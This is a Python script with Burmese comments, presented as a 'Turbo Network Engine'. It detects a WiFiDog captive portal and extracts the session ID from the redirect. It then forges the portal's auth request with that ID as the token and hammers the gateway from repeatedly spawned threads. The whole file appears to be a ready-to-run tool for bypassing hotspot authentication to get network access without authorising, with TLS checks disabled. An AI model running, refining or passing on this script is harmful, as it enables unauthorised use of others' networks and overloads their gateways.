import requests, re, urllib3, time, threading, random, os, sys
from urllib.parse import urlparse, parse_qs

# SSL Warning များကို ပိတ်ထားရန်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    print("\033[0;35m" + "="*40 + "\n   TURBO NETWORK ENGINE v2\n" + "="*40 + "\033[00m")

def high_speed_ping(auth_link):
    """High speed background ping threads"""
    while True:
        try:
            # တိုက်ရိုက် ping ပို့ပြီး connection ကို active ဖြစ်အောင် ထိန်းထားခြင်း
            requests.get(auth_link, timeout=5, verify=False)
            print(f"\r\033[0;32m[✓]\033[0m Engine Active | Sending Turbo Pings...", end="")
        except:
            pass
        time.sleep(0.1)

def start_process():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    
    print("\033[0;36m[*] Monitoring Network Status...\033[0m")
    
    while True:
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            
            # အကယ်၍ Login Page သို့ ရောက်သွားပါက (Captive Portal တွေ့လျှင်)
            if r.url != test_url:
                parsed = urlparse(r.url)
                params = parse_qs(parsed.query)
                
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                sid = params.get('sessionId', ['NONE'])[0]
                
                # Auth Link ကို တည်ဆောက်ခြင်း
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
                
                print(f"\n\033[0;33m[!] Portal Detected!\033[0m SID: {sid}")
                print("\033[0;34m[*] Launching Turbo Threads...\033[0m")
                
                # Thread ၅ ခုဖြင့် တစ်ပြိုင်နက် လုပ်ဆောင်ခြင်း
                for _ in range(5):
                    t = threading.Thread(target=high_speed_ping, args=(auth_link,), daemon=True)
                    t.start()
                    
            time.sleep(10)
        except KeyboardInterrupt:
            print("\n\033[0;31m[!] Stopped by User\033[0m")
            break
        except Exception as e:
            # Error တက်လျှင် ၅ စက္ကန့်နားပြီး ပြန်ကြိုးစားခြင်း
            time.sleep(5)

if __name__ == "__main__":
    start_process()
        
